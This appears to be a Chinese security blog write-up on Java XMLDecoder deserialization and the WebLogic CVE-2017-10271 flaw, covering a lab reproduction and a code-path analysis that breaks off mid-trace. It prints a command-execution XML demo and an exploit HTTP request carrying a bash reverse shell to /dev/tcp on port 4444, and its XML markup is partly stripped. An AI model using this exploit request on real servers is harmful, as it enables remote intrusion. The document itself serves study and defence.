# XMLEncoder&XMLDecoder
XMLDecoder/XMLEncoder 是在JDK1.4版中添加的 XML 格式序列化持久性方案，使用 XMLEncoder 来生成表示
JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的XML文档获取JavaBeans。
## XMLEncoder
例子代码如下
    package ghtwf01.demo;
    import javax.swing.*;
    import java.beans.XMLEncoder;
    import java.io.BufferedOutputStream;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    public class XmlEncoder {
        public static void main(String[] args) throws FileNotFoundException {
            XMLEncoder e = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("result.xml")));
            e.writeObject(new JButton("Hello,xml"));
            e.close();
        }
    }
序列化了JButton类，得到的XML文档如下
      Hello,xml
## XMLDecoder
例子代码如下
    package ghtwf01.demo;
    import java.beans.XMLDecoder;
    import java.io.*;
    public class XmlEncoder {
        public static void main(String[] args) throws FileNotFoundException {
            XMLDecoder d = new XMLDecoder(new BufferedInputStream(new FileInputStream("result.xml")));
            Object result = d.readObject();
            System.out.println(result);
            d.close();
        }
    }
使用 XMLDecoder 读取序列化的 XML 文档，获取 JButton 类并打印输出
    javax.swing.JButton[,0,0,0x0,invalid,alignmentX=0.0,alignmentY=0.5,border=com.apple.laf.AquaButtonBorder$Dynamic@1a6c5a9e,flags=288,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=0,left=2,bottom=0,right=2],paintBorder=true,paintFocus=true,pressedIcon=,rolloverEnabled=false,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Hello,xml,defaultCapable=true]
## XML标签、属性介绍
### string标签
`hello,xml`字符串的表示方式为`Hello,xml`
### object标签
通过 `` 标签表示对象， `class` 属性指定具体类(用于调用其内部方法)，`method`
属性指定具体方法名称(比如构造函数的的方法名为 `new` )
`new JButton("Hello,xml")` 对应的`XML`文档:
        Hello,xml
# void标签
通过 `void` 标签表示函数调用、赋值等操作， `method` 属性指定具体的方法名称。
`JButton b = new JButton();b.setText("Hello, world");` 对应的`XML`文档:
        Hello,xml
### array标签
通过 `array` 标签表示数组， `class` 属性指定具体类，内部 `void` 标签的 `index` 属性表示根据指定数组索引赋值。  
`String[] s = new String[3];s[1] = "Hello,xml";` 对应的`XML`文档:
        Hello,xml
# XMLDecoder反序列化漏洞
下面来看一个解析xml导致反序列化命令执行的demo:
    package ghtwf01.demo;
    import java.beans.XMLDecoder;
    import java.io.BufferedInputStream;
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    public class XmlDecoder {
        public static void main(String[] args) throws FileNotFoundException {
            XMLDecoder d = new XMLDecoder(new BufferedInputStream(new FileInputStream("/Users/ghtwf01/poc.xml")));
            Object result = d.readObject();
            d.close();
        }
    }
poc.xml
                    /bin/bash
                    -c
                    open -a Calculator
使用 java.lang.ProcessBuilder 进行代码执行，整个恶意 XML 反序列化后相当于执行代码:
    String[] cmd = new String[3];
    cmd[0] = "/bin/bash";
    cmd[1] = "-c";
    cmd[2] = "open /System/Applications/Calculator.app/";
    new ProcessBuilder(cmd).start();
# Weblogic-XMLDecoder漏洞复现
vulhub直接搭建环境，记得修改docker-compose.yml为如下
    version: '2'
    services:
     weblogic:
       image: vulhub/weblogic
       ports:
        - "7001:7001"
        - "8453:8453"
exp如下
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 192.168.50.145:7001
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Content-type: text/xml
    Connection: close
    Content-Length: 639
    /bin/bash
    -c
    bash -i >& /dev/tcp/192.168.50.145/4444 0>&1
这里要注意`Content-type`要设置为`text/xml`，不然会报415错误
# Weblogic-XMLDecoder反序列化漏洞分析
## 远程调试
之前我们搭建环境的时候已经修改了 docker-compose.yml 文件，添加了远程调试端口 8453 映射
进入容器，配置Weblogic开启远程调试:
修改`/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh`，添加配置代码
    debugFlag="true"
    export debugFlag
然后重启容器，再从dcoker里面从拷⻉Weblogic源码和JDK
`docker cp 692394a45a38:/root ./weblogic`
在 Middleware 目录下提取全部的 jar 、 war 包到 lib 目录
    cd /Users/ghtwf01/Desktop/ghtwf01/vulhub/weblogic/CVE-2017-10271/weblogic/Oracle/Middleware
    mkdir lib
    find ./ -name "*.jar" -exec cp {} ./lib/ \;
    find ./ -name "*.war" -exec cp {} ./lib/ \;
将Oracle/Middleware/wlserver_10.3 作为IDEA项目打开，设置JDK为拷⻉出来的，然后添加包含 lib 目录到项目的
Libraries
设置 DEBUG 模式为 Remote ，端口为与 docker 映射出去相同的 8453
现在就可以使用debug，如果控制台输出`Connected to the target VM, address:
'192.168.50.145:8453', transport: 'socket'`则说明配置成功
## CVE-2017-3506&CVE-2017-10271
影响范围
  * WebLogic 10.3.6.0
  * WebLogic 12.1.3.0
  * WebLogic 12.2.1.0
  * WebLogic 12.2.1.1
  * WebLogic 12.2.1.2
`CVE-2017-3506`和`CVE-2017-10271`均是 `XMLDecoder` 反序列化漏洞，`CVE-2017-3506`修补方案为禁用
`object` 标签。
`CVE-2017-10271`是通过 `void` 、 `new` 标签对`CVE-2017-3506`补丁的绕过。
这里以`CVE-2017-10271`为例进行漏洞分析
wls-wsat.war!/WEB-INF/web.xml
查看 `web.xml` ，可以发现存在漏洞的 `wls-wsat` 组件中包含不同的路由，均能触发漏洞
weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequest
这里var1的值是我们传入的恶意xml文档，var2是数据中的headers，var3是从var2中获取WorkAreaConstants.WORK_AREA_HEADER得到的，然后将var3放入readHeaderOld函数中
weblogic.wsee.jaxws.workcontext.WorkContextTube#readHeaderOld
var4 的字节数组输入流传入 WorkContextXmlInputAdapter 的构造函数
weblogic.wsee.workarea.WorkContextXmlInputAdapter#WorkContextXmlInputAdapter
包含恶意 XML 的输入流作为参数传入 XMLDecoder 的构造函数，返回一个 WorkContextXmlInputAdapter 实例对象到上层的
var6 ， var6 作为参数传入 receive 函数
weblogic.wsee.jaxws.workcontext.WorkContextServerTube#receive
继续跟进receiveRequest()函数
weblogic.workarea.WorkContextMapImpl#receiveRequest
被传递到 WorkContextLocalMap 类的 receiveRequest() 方法
weblogic.workarea.WorkContextLocalMap#receiveRequest